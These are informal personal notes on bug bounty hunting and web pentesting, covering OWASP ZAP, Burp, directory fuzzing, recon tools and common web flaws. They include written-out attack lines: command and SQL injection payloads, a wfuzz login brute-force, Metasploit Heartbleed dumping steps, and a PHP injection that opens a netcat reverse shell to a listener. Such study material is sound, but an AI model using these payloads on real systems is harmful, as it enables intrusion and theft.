this is the bug bounty notes. _________________

first important things that should be present in the bug report

    mention the title of the bug

    steps to produce it (how did u exploit it)

    how to patch it 

    what can bad guys do with that vulnerabiltity

    the environ ment used like browser os version etc ..

    and the details like url and location and the tag which is vulnerable should be used and 
    if u want u can add videos and images

    read the terms and condition properly

    dont for get to mention your details like email name etc ..

    edit the photos before uploading the screen short

    add your details and email

using firefox the extions are __________________________________________________________________________________________

websites

    cyberchief
    whatcms

    
    owasp zap ___________________________________________________________
    
    it has a interception proxy that is used to its mostly common as burpsuite

    to enabel the zap proxy we need to (if u have done evething in 1 and 2 go directly to the 3rd step)

        !)generate a certificate
        2)add that certificate for ssl and
        3) add the localhost and the port 8080 as the proxy in the browser

    you can set up zap to work wit any ip or port

        tools->options->local proxy

you can run a sider and u can use active scan to find easy vulnerabitiys

right click on the website to add thwe context (tis allows us to ignore few sites)

safe mode dont allows u to attack

protected mode allowes only to the urls within the scope 

standard mode allows all

u can flag the url;s as a log in page and u can highlite the loged in response so that zap auto login for u

now practing owasp

    1)authentication,session and user management

    -setup proxy
    -enable cert
    -go to the vulnerable website
    -set the scope
    -set auth -u can manually log in -u can set users also
    -set session management
    -spider 

    if u have mentioned the user u can spider as him

    you can force the users using force user tab to log in as the user in every page u have to enable it by pressing on the button on the owasp main window tab to enable force user 

    u can access the setting in the above icons
    ucan resend a message using right click

    2) Ajax Spidering authenticated websites

    -you can directly start ajax spider on the particular url if it didnt had any login page
    -you have to identifiy the cookie that is responsible to keep the session active which keeps u login
    mark it in the params tab and right click it and flag as session token

    -if it has login page log out if u are log in and again log in and now see http sessions tab and right 
    click it and add it in active
    
    -now run ajax spider in scope dont forget to remove the logout link from scope pick that requst or 
    identify the url make it out of scope in spider

    -now u can active scan all or pages in a sub tree
    -you can add the session tokens maually by tools->options->http sessions and add the token

    3)injection

    -active scan the particular domine for vulnerability
    -go to tools option to change the active scan modes
    -after the scan go to alerts tab and check 
    
    -in request tab u can fuzz the requst and have a sql fuzz list to confirm it and right click on the word 
    to fuzz it mostly the url is used for fuzzing

    -you can also encode and decode the hash from tools->encoder/decoder

    4)ZAP Deep Dive

    -USE MANUAL EXPLORE it does launch the browser and performs certain actions on the specified url

    - go to the local host proxy where the zap is running to get userfriendly easy methods
    -u can save the bug hutng prossos and expor it and import it anyone
    -some times variable of get and post use ;: for variables and zap doesnt find it
    
    -u can specify at the context options->structure add key value pair separators "&;" ,seperator as  "=:" it works only on the above eg for each websit it may vary

    -if a application runs and shows the pages according to a varible used in url eg page=home page =about page =contact us the zap will take that variable as constant then it will not attack it to avoid it go to "context option"->structor->add[structural parameter](button) and add the varible in that list for more refrence see from 14:00 - https://www.youtube.com/watch?v=1_flXEBzEsE&list=PLEBitBW-Hlsv8cEIUntAO8st2UGhmrjUB&index=24

    - you can code for zap in python and download form community scripts also cool!

    -some websites use 200 code for 404 error pages you can select the string from the error page response then right click and "flag as context" -> "default context coustom page" and select the error page or not found page etc ...

    -autentication some times can be from request and response viseversa u can change it in opetions of context
    - in oprtions passivescanner u can enable scan during fuzzer and many more options are avalable
    -the zap used to save logs 
    -you can automate the zap using command line and the doc is given in https://www.zaproxy.org/docs/desktop/cmdline/

    5)active scan

    -u can start active scan from quick start menu and u can select the normal spider or ajax spider 
    -by clicking in the show progress u can skip certain webpages
    -u can run multiple active scans depends on ur pc
    -u can right click on the web branch to run multiple acttacks also
    -u can change the polacy form the scan polociy icon to know more see the zap scan rules
    -u can enable attack mode from standard mode to scan pages where u are manually exploreing

    6)zap report generation 

    -you can generate a report from generate report icon
    
    7)u can program zap scripts with zest links

    -https://www.youtube.com/watch?v=DW_vXdEOoVA&list=PLEBitBW-Hlsv8cEIUntAO8st2UGhmrjUB&index=36

    8)fuzzing
    -u can use the fuzzer for bruteforce select file fuzzer for txt file 

    for more zap reference go through this https://www.youtube.com/playlist?list=PLEBitBW-Hlsv8cEIUntAO8st2UGhmrjUB

BUG BOUNTY tips

    -if u find any file called test in the webserver try to exploit it because it is more vulunerable
        --same as robot .txt
        --/.git/
        --backup or log
        --test
        --test.php
        --access_log or logs
        --access
        --etc
    
    -if u find the log or sql or backup or something strange files search for the admin logs 

Finding hidden directorys in a website 

    -there are many tools like dirserch,dirbuster,gobuster,dirb etc ....
        --eg cmd:-# dirsearch.py --url "http://10.0.2.10" -e txt,html,htm,sql,php,log

                where: 
                    "dirsearch.py" is the program avalibel in git
                    "--url" is a parameter to specify the url
                    ""http://10.0.2.10"" is the url
                    "-e" is a parameter to specify the website file extensions eg index.php
                    "txt,html,htm,sql,php,log" is the extensions

command injection

    -this is nothing but u can run the user commands in the given input

    -if the command injection doesnt show any output try to add some sleep and check whether the server request gets slow
        --cmd:-# ping -c 4 8.8.8.8; sleep 5
        --cmd:-# ping -c 4 8.8.8.8& sleep5
        --cmd:-# ping -c 4 8.8.8.8 | sleep 5

            note : sleep will make command req slow or make dns requset which we can track and the above mentioned cmd does not run in windows in windows try something like "ping 1.1.1.1;Start-Sleep -s 15" --for powershell and
            "ping 1.1.1.1;ping [your ip and check the network traffic]"

    -some languages use different commenting methods so follow accordingly

    -by tracking the response time we can see a delay made from server
    -https://www.acunetix.com/blog/articles/code-injection/
    -https://www.netsparker.com/blog/web-security/remote-code-evaluation-execution/

SQL injection     

    -same as the command injection but only works with the sql commands and "--" is the comment 

    -union can be used for printing values from other tables also

    -in case of the blind injection we can use sleep
    
        --cmd:-# code,sleep(1),sleep(10)

    -by tracking the response time we can see a delay made from server

    -use the sqlmap for more complex injections
    -https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/
    -https://www.exploit-db.com/papers/13045

sql defence

    -check online
    -https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/

csrf - cross site request forgery

    -check for csrf token if they exist try if they are predictable some time tokens dont work
    -some time u need to make the data in to json
    -https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html


xss

    -some times its hard to find it use the wordlist
    -https://excess-xss.com/

xxe 

    -this is a xml based attack and dos can be made with lots of laugh
    -try online wordlist and in requst if u saw xml

wfuzz

    -it is used to find web content,form manuplation,bruteforce use sec list if you are going to perform bruteforce

    -u can see options using
        # wfuzz --help

    -bruteforce eg
        # wfuzz -c -w /root/desktop/wordlist.txt --hs Invalid -d "log=admin@example.com&pwd=FUZZ" -u http://192.168.1.109/wp-login.php

            where:
                
                wfuzz = is the tool
                
                -c = output with colors
                
                -w = wordlist loctaion
                
                /root/desktop/wordlist.txt = wordlist
                
                --hs = this compares the regex and hides this considering as invalid opposite is "--ss"
                
                Invalid = the regex string on error or wrong password
                
                -d = post requst u can see this in burpsuit or zap
                
                "log=admin@example.com&pwd=FUZZ" = is the request and "FUZZ" is the place this program will bruteforce with different words from the word list
                
                -u = url to attack

                http://192.168.1.109/wp-login.php = url

    - reffer https://www.youtube.com/watch?v=1Do5VjeEVjg&list=PLBf0hzazHTGNJXBjepzN7l9OHcuH9ZvOq&index=2 for doubts

    anothor cmd for web content discovery

        # wfuzz -w /wordlist_loc --hc 403,404 -u http://asd.com/FUZZ

        where

            --hc = will hide the respose with the codes mention here it is 403,404 -sc is oposite

iframe and html injecttion

    -this is a vulnerability and u have to embed an external page in the iframe using url param to inject any thing.

    -or u can directly embed the html code in the request using burpsuite

burpsuite

    -enable the burp check proxy set in browser install cert
    -for more https://www.youtube.com/playlist?list=PLBf0hzazHTGO3EpGAs718LvLsiMIv9dSC -burpsuite pentest basics 

wafw00f - web application firewall detection tool

    -this application is used to find the firewall
    -usage :cmd-#wafw00f [url without bracket]

google dorking

    THIS is mostly used for infog or recon (passive) or footprinting
    some common pay loads - https://securitytrails.com/blog/google-hacking-techniques
    and examples - https://gist.github.com/clarketm/919457847cece7ce40323dc217623054
    hacking data base - https://www.exploit-db.com/google-hacking-database
    use ctrl + f to find required test

theHarvester

    this is a passive recon tool
    u can gather public information using this 
    eg : theHarvester -d starbucks.com -d google
    this command searches about the starbucks website in google 
    for help type help

Heartbleed Exploit

    u need to first scan the web server with nmap
    eg : sudo nmap -sV -A 192.168.1.158
    then  get the port and then run nmap script for heart bleed
    eg : sudo nmap -p 8448 --script ssl-heartbleed 192.168.25.55
    then start the metasploit 
    eg : msfconsole
    eg : search openssl_heartbleed
    eg : use auxlary/scanner/ssl/openssl_heartbleed
    eg : set rhost 192.12.147.22
    eg : set rport 1425
    eg : show info
    eg : set action scan    #just scans
    eg : run
    eg : set action dump    #dumps data

    open a new terminal 

    and run strings command on the gotten url
    
    eg : strings /home/alexs/.mssd/asd/asd/as/dads/a/d/a.bin     #converts into readable content

    it will dump all info u can read and find for vulnerable data
    google what u can do with the recived data

php code injection

    if u see any parameters in url like id=123 and if the website is running php this types of vulnerablity can be seen
    the php code injection doesnt reflect the html code
    use w3schools for same codes in php or exploit db

    eg exploit : id=123;system("pwd"); //this exploit shows the the current working directory

    u can enable the reverse shells and access usning netcat

    reverse shell using the nc or netcat

    hacker side(hs):- nc -nvlp 1234
    serverside in url:- id=123;system("nc 192.168.1.101 1234 -e /bin/bash"); //use cmd if the server is in windows
    
html injection reflected and stored post

    when the html input is dirctly get as input and posted in the web page then this is know as html inj and if this done with the form then this occur
    it can be eather stored or reflected and this is like xss but with html
    u can use this to get passwords using iframe and the netcat listener and this can be done oly by social enginering

os command injection 

    this happens when the input from the website is run in the os like ping command etc 
    this can be in any back end language bash,python,go etc ...
    we can run the local commands like whoami and u can directly run the net cat listener and the command
    use diffrent attributs like ;&| because some use prematured filtures

    eg: 123.com;pwd
        123.com&&pwd
        123.com||pwd
    
    u can use tools like commix use help
    eg : commix --url="url.com" --cookie="take from burp proxy with security level also" --data="the post requst sent include the submit if avalible "

    the comix will try complicated stuff
